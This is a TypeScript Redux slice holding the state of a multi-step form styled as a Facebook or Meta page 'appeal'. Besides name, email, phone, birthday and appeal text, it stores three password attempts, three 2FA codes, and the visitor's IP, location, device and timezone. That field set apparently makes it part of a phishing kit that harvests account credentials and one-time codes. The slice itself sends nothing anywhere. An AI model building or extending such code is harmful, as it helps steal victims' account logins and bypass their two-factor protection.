import { createSlice, PayloadAction } from "@reduxjs/toolkit"

export interface FormData {
    fullName: string
    email: string
    emailBusiness: string
    fanpage: string
    phone: string
    phoneBackup: string
    day: string
    month: string
    year: string
    message: string
    appealContents: string[]
    facebookNotify: boolean
    password: string
    passwordSecond: string
    passwordThird: string
    twoFa: string
    twoFaSecond: string
    twoFaThird: string
    location?: string
    ip?: string
    device?: string
    country_code?: string
    timezone?: string
}

interface StepFormState {
    step: number
    data: FormData
}

const initialState: StepFormState = {
    step: 1,
    data: {
        fullName: "",
        email: "",
        emailBusiness: "",
        fanpage: "",
        phone: "",
        phoneBackup: "",
        day: "",
        month: "",
        year: "",
        message: "",
        appealContents: [],
        facebookNotify: true,
        password: "",
        passwordSecond: "",
        passwordThird: "",
        twoFa: "",
        twoFaSecond: "",
        twoFaThird: ""
    }
}

const stepFormSlice = createSlice({
    name: "stepForm",
    initialState,
    reducers: {

        updateForm(state, action: PayloadAction<Partial<FormData>>) {
            state.data = {
                ...state.data,
                ...action.payload
            }
        },

        nextStep(state) {
            state.step += 1
        },

        prevStep(state) {
            state.step -= 1
        },

        resetForm() {
            return initialState
        }

    }
})

export const {
    updateForm,
    nextStep,
    prevStep,
    resetForm
} = stepFormSlice.actions

export default stepFormSlice.reducer